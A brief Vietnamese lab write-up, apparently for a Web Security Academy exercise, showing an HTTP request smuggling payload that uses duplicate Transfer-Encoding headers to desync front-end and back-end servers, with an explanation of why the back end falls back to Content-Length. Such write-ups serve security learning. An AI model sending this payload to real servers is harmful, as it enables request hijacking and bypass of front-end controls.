## HTTP request smuggling, obfuscating the TE header

1. Ở lab này, cả 2 phía FE và BE đều xử lý TE header. Tiến hành bypass bằng duplicate header
- Payload: 
```
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cuong

67
GPOST / HTTP/1.1
HOST: 0a2500d6036339b4c018f92100e5007b.web-security-academy.net
Content-Length: 15

0


```

![image](https://user-images.githubusercontent.com/80744099/226584819-8135c5c2-3191-4712-8f93-e779df5abbae.png)

2. Tuy ở đây 2 phía đều xử lý message body bằng TE header nhưng việc xử lý duplicate header lại khác nhau. Có thể là phía FE nhận giá trị đầu tiên, còn phía BE lại lấy header cuối cũng, trong trường hợp này giá trị `cuong` không xác định trong trường `Transfer-Encoding` nên có thể BE server tiến hành xử lý theo Content-Length. 
